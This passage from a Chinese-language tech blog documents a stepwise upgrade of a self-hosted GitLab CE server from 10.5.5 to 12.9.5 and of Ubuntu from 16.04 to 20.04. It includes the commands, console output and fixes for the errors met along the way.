class="line">gitlab-ce/xenial 11.0.4-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.0.3-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.0.2-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.0.1-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 11.0.0-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 10.8.7-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 10.8.6-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 10.8.5-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 10.8.4-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 10.8.3-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 10.8.2-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 10.8.1-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 10.8.0-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 10.7.7-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 10.7.6-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 10.7.5-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 10.7.4-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 10.7.3-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 10.7.2-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 10.7.1-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial,xenial 10.7.0-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 10.6.6-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 10.6.5-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 10.6.4-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 10.6.3-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 10.6.2-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 10.6.1-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 10.6.0-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 10.5.8-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 10.5.7-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 10.5.6-ce.0 amd64</span><br><span class="line">gitlab-ce/xenial 10.5.5-ce.0 amd64</span><br><span class="line">gitlab-ce/now 10.5.5-ce.0 amd64 [installed,upgradable to: 13.12.15-ce.0]</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h3 id="三、Gitlab升级Path"><a href="#三、Gitlab升级Path" class="headerlink" title="三、Gitlab升级Path"></a>三、Gitlab升级Path</h3><p>查看<a href="https://docs.gitlab.com/ee/update/index.html#upgrade-paths" target="_blank" rel="noopener">【支持的升级路径】：</a></p>
<p><img src="/images/git/gitlab版本升级要求.png" alt></p>
<blockquote>
<p>应该是各个版本的数据库不一致</p>
</blockquote>
<h3 id="四、升级Gitlab"><a href="#四、升级Gitlab" class="headerlink" title="四、升级Gitlab"></a>四、升级Gitlab</h3><p>参考路径 <code>10.4.5 -&gt; 10.8.7 -&gt; 11.11.8 -&gt; 12.0.12 -&gt; 12.1.17 -&gt; 12.9.5</code> ，决定先从 <code>10.5.5</code> 升级到 <code>10.8.7</code> 版本。</p>
<h4 id="1-10-5-5-升级到-10-8-7"><a href="#1-10-5-5-升级到-10-8-7" class="headerlink" title="1. 10.5.5 升级到 10.8.7"></a>1. <code>10.5.5</code> 升级到 <code>10.8.7</code></h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> apt list --upgradable -a |grep 10.8.7</span></span><br><span class="line">gitlab-ce/xenial 10.8.7-ce.0 amd64</span><br><span class="line"><span class="meta">#</span><span class="bash"> 安装指定版本</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> apt install gitlab-ce=10.8.7-ce.0</span></span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree</span><br><span class="line">Reading state information... Done</span><br><span class="line">The following packages were automatically installed and are no longer required:</span><br><span class="line">  linux-headers-4.4.0-31 </span><br><span class="line">  linux-headers-4.4.0-31-generic </span><br><span class="line">  linux-image-4.4.0-31-generic </span><br><span class="line">  linux-image-extra-4.4.0-31-generic</span><br><span class="line">Use 'apt autoremove' to remove them.</span><br><span class="line">The following packages will be upgraded:</span><br><span class="line">  gitlab-ce</span><br><span class="line">1 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.</span><br><span class="line">Need to get 425 MB of archives.</span><br><span class="line">After this operation, 115 MB of additional disk space will be used.</span><br><span class="line">Get:1 https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/ubuntu xenial/main </span><br><span class="line">amd64 gitlab-ce amd64 10.8.7-ce.0 [425 MB]</span><br><span class="line">Fetched 425 MB in 3min 47s (1,867 kB/s)</span><br><span class="line">(Reading database ... 225666 files and directories currently installed.)</span><br><span class="line">Preparing to unpack .../gitlab-ce_10.8.7-ce.0_amd64.deb ...</span><br><span class="line">Unpacking gitlab-ce (10.8.7-ce.0) over (10.5.5-ce.0) ...</span><br><span class="line">Setting up gitlab-ce (10.8.7-ce.0) ...</span><br><span class="line">Checking PostgreSQL executables:Starting Chef Client, version 13.6.4</span><br><span class="line">resolving cookbooks for run list: ["gitlab::config", "postgresql::bin"]</span><br><span class="line">Synchronizing Cookbooks:</span><br><span class="line">  - postgresql (0.1.0)</span><br><span class="line">  - gitlab (0.0.1)</span><br><span class="line">  - consul (0.0.0)</span><br><span class="line">  - package (0.1.0)</span><br><span class="line">  - registry (0.1.0)</span><br><span class="line">  - mattermost (0.1.0)</span><br><span class="line">  - letsencrypt (0.1.0)</span><br><span class="line">  - gitaly (0.1.0)</span><br><span class="line">  - runit (0.14.2)</span><br><span class="line">  - nginx (0.1.0)</span><br><span class="line">  - acme (3.1.0)</span><br><span class="line">  - crond (0.1.0)</span><br><span class="line">  - compat_resource (12.19.0)</span><br><span class="line">Installing Cookbook Gems:</span><br><span class="line">Compiling Cookbooks...</span><br><span class="line">Converging 1 resources</span><br><span class="line">Recipe: postgresql::bin</span><br><span class="line">  * ruby_block[Link postgresql bin files to the correct version] </span><br><span class="line">    action run (skipped due to only_if)</span><br><span class="line"></span><br><span class="line">Running handlers:</span><br><span class="line">Running handlers complete</span><br><span class="line">Chef Client finished, 0/1 resources updated in 03 seconds</span><br><span class="line">Checking PostgreSQL executables: OK</span><br><span class="line">Found /etc/gitlab/skip-auto-migrations, exiting...</span><br><span class="line"></span><br><span class="line">     _______ __  __          __</span><br><span class="line">    / ____(_) /_/ /   ____ _/ /_</span><br><span class="line">   / / __/ / __/ /   / __ `/ __ \</span><br><span class="line">  / /_/ / / /_/ /___/ /_/ / /_/ /</span><br><span class="line">  \____/_/\__/_____/\__,_/_.___/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Upgrade complete! If your GitLab server is misbehaving try running</span><br><span class="line">  sudo gitlab-ctl restart</span><br><span class="line">before anything else.</span><br><span class="line">If you need to roll back to the previous version you can use the database</span><br><span class="line">backup made during the upgrade (scroll up for the filename).</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> gitlab-rake gitlab:env:info</span></span><br><span class="line"></span><br><span class="line">System information</span><br><span class="line">System:         Ubuntu 16.04</span><br><span class="line">Current User:   git</span><br><span class="line">Using RVM:      no</span><br><span class="line">Ruby Version:   2.3.7p456</span><br><span class="line">Gem Version:    2.6.14</span><br><span class="line">Bundler Version:1.13.7</span><br><span class="line">Rake Version:   12.3.1</span><br><span class="line">Redis Version:  3.2.11</span><br><span class="line">Git Version:    2.16.4</span><br><span class="line">Sidekiq Version:5.0.5</span><br><span class="line">Go Version:     unknown</span><br><span class="line"></span><br><span class="line">GitLab information</span><br><span class="line">Version:        10.8.7</span><br><span class="line">Revision:       eb600b0</span><br><span class="line">Directory:      /opt/gitlab/embedded/service/gitlab-rails</span><br><span class="line">DB Adapter:     postgresql</span><br><span class="line">Using LDAP:     no</span><br><span class="line">Using Omniauth: no</span><br><span class="line"></span><br><span class="line">GitLab Shell</span><br><span class="line">Version:        7.1.2</span><br><span class="line">Repository storage paths:</span><br><span class="line">- default:      /var/opt/gitlab/git-data/repositories</span><br><span class="line">Hooks:          /opt/gitlab/embedded/service/gitlab-shell/hooks</span><br><span class="line">Git:            /opt/gitlab/embedded/bin/git</span><br></pre></td></tr></table></figure>
<p>升级完成，但访问 Gitlab Web 出现500错误<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 尝试修复</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gitlab-ctl restart</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gitlab-ctl restart sidekiq</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gitlab-ctl hup unicorn</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> prometheus服务没起来</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gitlab-ctl status</span></span><br><span class="line">run: gitaly: (pid 774) 35s; run: log: (pid 769) 35s</span><br><span class="line">run: gitlab-monitor: (pid 773) 35s; run: log: (pid 772) 35s</span><br><span class="line">run: gitlab-workhorse: (pid 783) 35s; run: log: (pid 782) 35s</span><br><span class="line">run: logrotate: (pid 771) 35s; run: log: (pid 770) 35s</span><br><span class="line">run: nginx: (pid 791) 35s; run: log: (pid 790) 35s</span><br><span class="line">run: node-exporter: (pid 776) 35s; run: log: (pid 775) 35s</span><br><span class="line">run: postgres-exporter: (pid 794) 35s; run: log: (pid 793) 35s</span><br><span class="line">run: postgresql: (pid 792) 35s; run: log: (pid 789) 35s</span><br><span class="line">down: prometheus: 0s, normally up, want up; run: log: (pid 785) 35s</span><br><span class="line">run: redis: (pid 778) 35s; run: log: (pid 777) 35s</span><br><span class="line">run: redis-exporter: (pid 780) 35s; run: log: (pid 779) 35s</span><br><span class="line">run: sidekiq: (pid 788) 35s; run: log: (pid 787) 35s</span><br><span class="line">run: unicorn: (pid 784) 35s; run: log: (pid 781) 35s</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看prometheus的日志</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tail -f -n 100 /var/<span class="built_in">log</span>/gitlab/prometheus/current</span></span><br><span class="line">level=error msg="Could not open the fingerprint-to-metric index for archived series.</span><br><span class="line"> Please try a 3rd party tool to repair LevelDB in directory </span><br><span class="line"> "/var/opt/gitlab/prometheus/data/archived_fingerprint_to_metric". </span><br><span class="line"> If unsuccessful or undesired, delete the whole directory and</span><br><span class="line">  restart Prometheus for crash recovery. You will lose all archived time series."</span><br><span class="line">   source="persistence.go:213"</span><br><span class="line">level=error msg="Error opening memory series storage: </span><br><span class="line">leveldb: manifest corrupted (field 'comparer'): </span><br><span class="line">missing [file=MANIFEST-000158]" source="main.go:192"</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 修复prometheus</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> apt install python-pip</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> pip install leveldb</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo -u gitlab-prometheus python -c <span class="string">"import leveldb; leveldb.RepairDB('/var/opt/gitlab/prometheus/data/archived_fingerprint_to_metric')"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> gitlab-ctl status</span></span><br><span class="line">run: gitaly: (pid 834) 41s; run: log: (pid 833) 41s</span><br><span class="line">run: gitlab-monitor: (pid 863) 41s; run: log: (pid 862) 41s</span><br><span class="line">run: gitlab-workhorse: (pid 836) 41s; run: log: (pid 835) 41s</span><br><span class="line">run: logrotate: (pid 817) 41s; run: log: (pid 811) 41s</span><br><span class="line">run: nginx: (pid 815) 41s; run: log: (pid 814) 41s</span><br><span class="line">run: node-exporter: (pid 861) 41s; run: log: (pid 860) 41s</span><br><span class="line">run: postgres-exporter: (pid 816) 41s; run: log: (pid 813) 41s</span><br><span class="line">run: postgresql: (pid 871) 41s; run: log: (pid 870) 41s</span><br><span class="line">run: prometheus: (pid 812) 41s; run: log: (pid 810) 41s</span><br><span class="line">run: redis: (pid 865) 41s; run: log: (pid 864) 41s</span><br><span class="line">run: redis-exporter: (pid 852) 41s; run: log: (pid 851) 41s</span><br><span class="line">run: sidekiq: (pid 830) 41s; run: log: (pid 828) 41s</span><br><span class="line">run: unicorn: (pid 869) 41s; run: log: (pid 868) 41s</span><br></pre></td></tr></table></figure></p>
<p>访问 Gitlab Web 还是出现500错误，网上说很有可能是升级关系数据库的原因。<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 查看关系数据库的升级状态，果然很多错误</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gitlab-rake db:migrate:status</span></span><br><span class="line">  down    20180502122856  Create project mirror data</span><br><span class="line">  down    20180502134117  Migrate import attributes data from projects to project mirror data</span><br><span class="line">  down    20180503131624  Create remote mirrors</span><br><span class="line">  down    20180503141722  Add remote mirror available overridden to projects</span><br><span class="line">  down    20180503150427  Add index to namespaces runners token</span><br><span class="line">  down    20180503175053  Ensure missing columns to project mirror data</span><br><span class="line">  down    20180503175054  Add indexes to project mirror data</span><br><span class="line">  down    20180503193542  Add indexes to remote mirror</span><br><span class="line">  down    20180503193953  Add mirror available to application settings</span><br><span class="line">  down    20180503200320  Enable prometheus metrics by default</span><br><span class="line">  down    20180508055821  Make remote mirrors disabled by default</span><br><span class="line">  down    20180508100222  Add not null constraint to project mirror data foreign key</span><br><span class="line">  down    20180508102840  Add unique constraint to project mirror data project id index</span><br><span class="line">  down    20180529093006  Ensure remote mirror columns</span><br><span class="line"><span class="meta">#</span><span class="bash"> 升级数据库</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gitlab-ctl stop <span class="comment"># (注意：先停止服务)</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gitlab-rake db:migrate</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gitlab-ctl start  <span class="comment"># (注意：先开启服务)</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gitlab-ctl reconfigure</span></span><br><span class="line"></span><br><span class="line">Running handlers:</span><br><span class="line">Running handlers complete</span><br><span class="line">Chef Client finished, 31/558 resources updated in 34 seconds</span><br><span class="line"></span><br><span class="line">Deprecations:</span><br><span class="line"></span><br><span class="line">Old file /etc/gitlab/skip-auto-migrations found.</span><br><span class="line">This file will stop being checked in GitLab 11, use /etc/gitlab/skip-auto-reconfigure</span><br><span class="line">instead.  This file has been automatically created for you as a migration aid.</span><br><span class="line"></span><br><span class="line">To disable this message, remove the deprecated /etc/gitlab/skip-auto-migrations</span><br><span class="line"></span><br><span class="line">gitlab Reconfigured!</span><br></pre></td></tr></table></figure></p>
<p>到这里就500错误就解决了，可以正常访问Gitlab Web，至此升级 <code>gtilab-ce-10.8.7</code> 成功。</p>
<p>总结升级流程：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> apt install gitlab-ce=10.8.7-ce.0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 修复prometheus的leveldb</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> apt install python-pip</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> pip install leveldb</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo -u gitlab-prometheus python -c <span class="string">"import leveldb; leveldb.RepairDB('/var/opt/gitlab/prometheus/data/archived_fingerprint_to_metric')"</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> gitlab-ctl stop <span class="comment"># (注意：先停止服务)</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gitlab-rake db:migrate <span class="comment"># 升级数据库</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gitlab-ctl start  <span class="comment"># (注意：先开启服务)</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gitlab-ctl reconfigure <span class="comment"># 重新生成配置</span></span></span><br></pre></td></tr></table></figure></p>
<h4 id="2-10-8-7-升级到-11-11-8"><a href="#2-10-8-7-升级到-11-11-8" class="headerlink" title="2. 10.8.7 升级到 11.11.8"></a>2. <code>10.8.7</code> 升级到 <code>11.11.8</code></h4><p>接下来，准备升级到 <code>gitlab-ce-11.11.8</code>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> apt install gitlab-ce=11.11.8-ce.0  <span class="comment"># 清华大学的源下载这个很慢 172 kB/s </span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gitlab-ctl reconfigure</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gitlab-ctl restart</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gitlab-ctl restart sidekiq</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gitlab-ctl hup unicorn</span></span><br></pre></td></tr></table></figure>
<p>11.11.8版本不用升级数据库就能正常访问了。</p>
<h4 id="3-预下载deb文件"><a href="#3-预下载deb文件" class="headerlink" title="3. 预下载deb文件"></a>3. 预下载deb文件</h4><p>吸取<code>gitlab-ce-11.11.8</code>版本下载太慢的教训，用迅雷（确实快）预先从<a href="https://mirror.tuna.tsinghua.edu.cn/gitlab-ce/ubuntu/pool/xenial/main/g/gitlab-ce/" target="_blank" rel="noopener">【gitlab-ce/xenial】</a>下载需要的版本</p>
<ul>
<li><a href="https://mirror.tuna.tsinghua.edu.cn/gitlab-ce/ubuntu/pool/xenial/main/g/gitlab-ce/gitlab-ce_12.0.12-ce.0_amd64.deb" target="_blank" rel="noopener">12.0.12</a></li>
<li><a href="https://mirror.tuna.tsinghua.edu.cn/gitlab-ce/ubuntu/pool/xenial/main/g/gitlab-ce/gitlab-ce_12.1.17-ce.0_amd64.deb" target="_blank" rel="noopener">12.1.17</a></li>
<li><a href="https://mirror.tuna.tsinghua.edu.cn/gitlab-ce/ubuntu/pool/xenial/main/g/gitlab-ce/gitlab-ce_12.9.5-ce.0_amd64.deb" target="_blank" rel="noopener">12.9.5</a></li>
</ul>
<h4 id="4-11-11-8-升级到-12-0-12"><a href="#4-11-11-8-升级到-12-0-12" class="headerlink" title="4. 11.11.8 升级到 12.0.12"></a>4. <code>11.11.8</code> 升级到 <code>12.0.12</code></h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> dpkg -i gitlab-ce_12.0.12-ce.0_amd64.deb</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gitlab-ctl reconfigure</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gitlab-ctl restart</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gitlab-ctl restart sidekiq</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gitlab-ctl hup unicorn</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 能正常访问</span></span><br></pre></td></tr></table></figure>
<h4 id="5-12-0-12-升级到-12-1-17"><a href="#5-12-0-12-升级到-12-1-17" class="headerlink" title="5. 12.0.12 升级到 12.1.17"></a>5. <code>12.0.12</code> 升级到 <code>12.1.17</code></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ dpkg -i gitlab-ce_12.1.17-ce.0_amd64.deb</span><br><span class="line">$ gitlab-ctl reconfigure</span><br><span class="line">$ gitlab-ctl restart</span><br><span class="line">$ gitlab-ctl restart sidekiq</span><br><span class="line">$ gitlab-ctl hup unicorn</span><br><span class="line"># 能正常访问</span><br></pre></td></tr></table></figure>
<h4 id="6-12-1-17-升级到-12-9-5"><a href="#6-12-1-17-升级到-12-9-5" class="headerlink" title="6. 12.1.17 升级到 12.9.5"></a>6. <code>12.1.17</code> 升级到 <code>12.9.5</code></h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> dpkg -i gitlab-ce_12.9.5-ce.0_amd64</span></span><br><span class="line">GitLab now ships with a newer version of PostgreSQL (11.7), but it is not yet</span><br><span class="line">enabled by default. To upgrade, please see:</span><br><span class="line">https://docs.gitlab.com/omnibus/settings/database.html#upgrade-packaged-postgresql-server</span><br><span class="line"><span class="meta">#</span><span class="bash"> 提示要升级PostgreSQL</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> gitlab-ctl reconfigure</span></span><br><span class="line">Warnings:</span><br><span class="line">The version of the running postgresql service is different than what is installed.</span><br><span class="line">Please restart postgresql to start the new version.</span><br><span class="line"></span><br><span class="line">sudo gitlab-ctl restart postgresql</span><br><span class="line"></span><br><span class="line">gitlab Reconfigured!</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> gitlab-ctl restart</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gitlab-ctl restart sidekiq</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gitlab-ctl hup unicorn</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 502错误</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 升级PostgreSQL（https://docs.gitlab.com/omnibus/settings/database.html<span class="comment">#gitlab-128-and-later）</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gitlab-ctl pg-upgrade -V 11</span></span><br><span class="line">Checking for an omnibus managed postgresql: OK</span><br><span class="line">Checking if postgresql['version'] is set: OK</span><br><span class="line">Checking if we already upgraded: NOT OK</span><br><span class="line">Checking for a newer version of PostgreSQL to install</span><br><span class="line">Upgrading PostgreSQL to 11.7</span><br><span class="line">Checking if PostgreSQL bin files are symlinked to the expected location: OK</span><br><span class="line">Waiting 30 seconds to ensure tasks complete before PostgreSQL upgrade.</span><br><span class="line">See https://docs.gitlab.com/omnibus/settings/database.html#upgrade-packaged-postgresql-server for details</span><br><span class="line">If you do not want to upgrade the PostgreSQL server at this time, enter Ctrl-C and see the documentation for details</span><br><span class="line"></span><br><span class="line">Please hit Ctrl-C now if you want to cancel the operation.</span><br><span class="line">Toggling deploy page:cp /opt/gitlab/embedded/service/gitlab-rails/public/deploy.html /opt/gitlab/embedded/service/gitlab-rails/public/index.html</span><br><span class="line"></span><br><span class="line">Toggling services: OK</span><br><span class="line">==== Upgrade has completed ====</span><br><span class="line">Please verify everything is working and run the following if so</span><br><span class="line">sudo rm -rf /var/opt/gitlab/postgresql/data.9.6</span><br><span class="line">sudo rm -f /var/opt/gitlab/postgresql-version.old</span><br><span class="line"><span class="meta">#</span><span class="bash"> 可以正常访问</span></span><br></pre></td></tr></table></figure>
<p>至此，完成了 <code>10.4.5 -&gt; 10.8.7 -&gt; 11.11.8 -&gt; 12.0.12 -&gt; 12.1.17 -&gt; 12.9.5</code> 升级路径。</p>
<h3 id="五、升级Ubuntu18-04"><a href="#五、升级Ubuntu18-04" class="headerlink" title="五、升级Ubuntu18.04"></a>五、升级Ubuntu18.04</h3><p>想一下还可以将系统升级到18.04，免得到时候16.04也停服了。<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> vim /etc/apt/sources.list.d/gitlab-ce.list</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 注释掉这个源</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 执行升级</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="keyword">do</span>-release-upgrade</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 等待下载升级</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 升级完成重启</span></span><br><span class="line">Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-166-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System load:  1.67                Processes:           263</span><br><span class="line">  Usage of /:   12.6% of 116.77GB   Users logged in:     0</span><br><span class="line">  Memory usage: 27%                 IP address for eth0: 192.168.0.166</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line">  =&gt; There is 1 zombie process.</span><br><span class="line"></span><br><span class="line">0 updates can be applied immediately.</span><br><span class="line"></span><br><span class="line">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span><br><span class="line">applicable law.</span><br></pre></td></tr></table></figure></p>
<p>升级完重启后，Gitlab是正常的，可以访问！<br>查看一下当前版本。<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gitlab-rake gitlab:env:info</span></span><br><span class="line"></span><br><span class="line">System information</span><br><span class="line">System:         Ubuntu 18.04</span><br><span class="line">Current User:   git</span><br><span class="line">Using RVM:      no</span><br><span class="line">Ruby Version:   2.6.5p114</span><br><span class="line">Gem Version:    2.7.10</span><br><span class="line">Bundler Version:1.17.3</span><br><span class="line">Rake Version:   12.3.3</span><br><span class="line">Redis Version:  5.0.7</span><br><span class="line">Git Version:    2.24.3</span><br><span class="line">Sidekiq Version:5.2.7</span><br><span class="line">Go Version:     unknown</span><br><span class="line"></span><br><span class="line">GitLab information</span><br><span class="line">Version:        12.9.5</span><br><span class="line">Revision:       58afee038ec</span><br><span class="line">Directory:      /opt/gitlab/embedded/service/gitlab-rails</span><br><span class="line">DB Adapter:     PostgreSQL</span><br><span class="line">DB Version:     11.7</span><br><span class="line">Using LDAP:     no</span><br><span class="line">Using Omniauth: yes</span><br><span class="line">Omniauth Providers:</span><br><span class="line"></span><br><span class="line">GitLab Shell</span><br><span class="line">Version:        12.0.0</span><br><span class="line">Repository storage paths:</span><br><span class="line">- default:      /var/opt/gitlab/git-data/repositories</span><br><span class="line">GitLab Shell path: /opt/gitlab/embedded/service/gitlab-shell</span><br><span class="line">Git:            /opt/gitlab/embedded/bin/git</span><br></pre></td></tr></table></figure></p>
<p>升级后的优化<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 删除无用的旧包</span><br><span class="line">$ apt autoremove</span><br><span class="line"></span><br><span class="line">$ vim /etc/apt/sources.list</span><br><span class="line"># 已经自动修改为18.04的源bionic</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 手动修改gitlab源</span><br><span class="line">$ vim /etc/apt/sources.list.d/gitlab-ce.list</span><br><span class="line"># deb https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/ubuntu bionic main</span><br></pre></td></tr></table></figure></p>
<h3 id="六、升级Ubuntu20-04"><a href="#六、升级Ubuntu20-04" class="headerlink" title="六、升级Ubuntu20.04"></a>六、升级Ubuntu20.04</h3><p>顺便升级到20.04<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 执行升级</span><br><span class="line">$ do-release-upgrade</span><br><span class="line"></span><br><span class="line">Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-96-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System load:  0.59                Processes:             325</span><br><span class="line">  Usage of /:   13.7% of 116.77GB   Users logged in:       0</span><br><span class="line">  Memory usage: 27%                 IPv4 address for eth0: 192.168.0.166</span><br><span class="line">  Swap usage:   0%</span><br></pre></td></tr></table></figure></p>
<p>升级完成后，出现502错误。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gitlab-ctl reconfigure</span></span><br></pre></td></tr></table></figure>
<p>恢复正常。</p>
<p>查看一下信息<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gitlab-rake gitlab:env:info</span><br><span class="line"></span><br><span class="line">System information</span><br><span class="line">System:         Ubuntu 20.04</span><br><span class="line">Current User:   git</span><br><span class="line">Using RVM:      no</span><br><span class="line">Ruby Version:   2.6.5p114</span><br><span class="line">Gem Version:    2.7.10</span><br><span class="line">Bundler Version:1.17.3</span><br><span class="line">Rake Version:   12.3.3</span><br><span class="line">Redis Version:  5.0.7</span><br><span class="line">Git Version:    2.24.3</span><br><span class="line">Sidekiq Version:5.2.7</span><br><span class="line">Go Version:     unknown</span><br><span class="line"></span><br><span class="line">GitLab information</span><br><span class="line">Version:        12.9.5</span><br><span class="line">Revision:       58afee038ec</span><br><span class="line">Directory:      /opt/gitlab/embedded/service/gitlab-rails</span><br><span class="line">DB Adapter:     PostgreSQL</span><br><span class="line">DB Version:     11.7</span><br><span class="line">Using LDAP:     no</span><br><span class="line">Using Omniauth: yes</span><br><span class="line">Omniauth Providers:</span><br><span class="line"></span><br><span class="line">GitLab Shell</span><br><span class="line">Version:        12.0.0</span><br><span class="line">Repository storage paths:</span><br><span class="line">- default:      /var/opt/gitlab/git-data/repositories</span><br><span class="line">GitLab Shell path: /opt/gitlab/embedded/service/gitlab-shell</span><br><span class="line">Git:            /opt/gitlab/embedded/bin/git</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>git</category>
      </categories>
  </entry>
  <entry>
    <title>gitlab邮箱配置</title>
    <url>/git/gitlab%E9%82%AE%E7%AE%B1%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p><a href="https://docs.gitlab.com/omnibus/settings/smtp.html" target="_blank" rel="noopener">配置指南</a> ，这是有官方给的各种邮箱的配置示例。</p>
